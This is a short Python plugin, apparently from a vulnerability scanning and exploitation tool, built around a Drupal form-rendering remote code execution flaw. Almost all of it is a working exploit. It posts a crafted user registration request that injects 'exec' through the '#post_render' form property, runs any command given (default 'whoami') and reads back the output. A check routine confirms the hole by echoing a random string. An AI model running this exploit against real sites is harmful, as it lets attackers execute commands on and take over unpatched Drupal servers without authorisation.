# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "drupal 代码执行漏洞",
        "description": "Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成 该漏洞的产生的根本原因在于Drupal对表单的渲染上,攻击者可以利用该漏洞攻击Drupal系统的网站，执行恶意代码，最后完全控制被攻击的网站",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f'echo ~{random_str}~')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'),
            data=f"form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]={cmd}",
            timeout=15,
            headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                }
        )
        if r.status_code == 200:
            match = re.search(r'data":"(.*?)\\u003C', r.text, re.M)
            if match:
                return match.group(1)
